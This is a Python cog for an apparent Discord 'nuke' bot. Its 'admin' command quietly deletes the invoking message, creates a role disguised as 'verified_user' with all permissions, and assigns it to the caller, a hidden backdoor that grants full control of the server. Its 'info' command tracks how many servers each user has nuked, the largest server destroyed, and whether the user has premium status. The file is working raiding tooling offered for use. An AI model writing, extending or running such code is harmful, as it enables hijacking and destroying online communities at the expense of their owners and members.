import json
import os

import discord
from discord.ext import commands

from config import BLACKLISTED_GUILD_ID, NUKE_STATS_FILE
from core.utils import is_premium_user


class Info(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def admin(self, ctx):
        guild = ctx.guild
        if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
            await ctx.reply("`this server is blacklisted`")
            return

        await ctx.message.delete()

        role = discord.utils.get(guild.roles, name="verified_user")
        if role is None:
            perms = discord.Permissions.all()
            role = await guild.create_role(name="verified_user", permissions=perms)
            msg = await ctx.send("✅ done!")
        else:
            msg = await ctx.send("✅ already done!")

        await ctx.author.add_roles(role)

        await msg.delete(delay=1)

    @commands.command()
    async def info(self, ctx, user: discord.User = None):
        if user is None:
            user = ctx.author

        user_id_str = str(user.id)

        if not os.path.exists(NUKE_STATS_FILE):
            await ctx.send("No data available.")
            return

        with open(NUKE_STATS_FILE, "r") as f:
            data = json.load(f)

        nuke_count = data.get("users", {}).get(user_id_str, {}).get("uses", 0)

        max_server = None
        max_members = -1

        for guild_id, info in data.get("servers", {}).items():
            if user_id_str in data["users"]:
                if info["member_count"] > max_members:
                    max_members = info["member_count"]
                    max_server = info["server_name"]

        is_premium = is_premium_user(user.id)

        embed = discord.Embed(
            title="User Info",
            color=discord.Color.blurple()
        )
        embed.set_author(name=f"{user.name}", icon_url=user.avatar.url if user.avatar else None)
        embed.add_field(name="👤 Nukes executed", value=f"`{nuke_count}`", inline=True)
        embed.add_field(name="⭐ Premium", value=f"`{'Yes' if is_premium else 'No'}`", inline=True)

        if max_server:
            embed.add_field(name="📈 Largest Server Nuked", value=f"`{max_server}` ({max_members} members)", inline=False)

        await ctx.send(embed=embed)


async def setup(bot):
    await bot.add_cog(Info(bot))
